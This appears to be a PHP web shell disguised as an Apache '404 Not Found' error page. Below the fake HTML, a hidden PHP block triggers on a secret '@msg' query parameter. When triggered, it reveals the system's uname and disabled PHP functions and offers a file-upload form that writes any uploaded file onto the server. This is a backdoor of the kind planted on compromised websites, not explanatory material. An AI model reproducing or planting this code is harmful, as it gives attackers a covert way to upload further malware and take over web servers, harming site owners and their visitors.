<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /easd was not found on this server.</p>
</body></html>
<?php
if(isset($_GET["@msg"]))
{
  echo"<font color=grey>".php_uname()."";
  print "\n";$disable_functions = @ini_get("disable_functions"); 
  echo "<br>DisablePHP=".$disable_functions; print "\n"; 
  echo"<br><form method=post enctype=multipart/form-data>"; 
  echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
    if($_POST["k"]==upload)
	 if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])) 
	 
  echo"<b>".$_FILES["f"]["name"]; } ?>
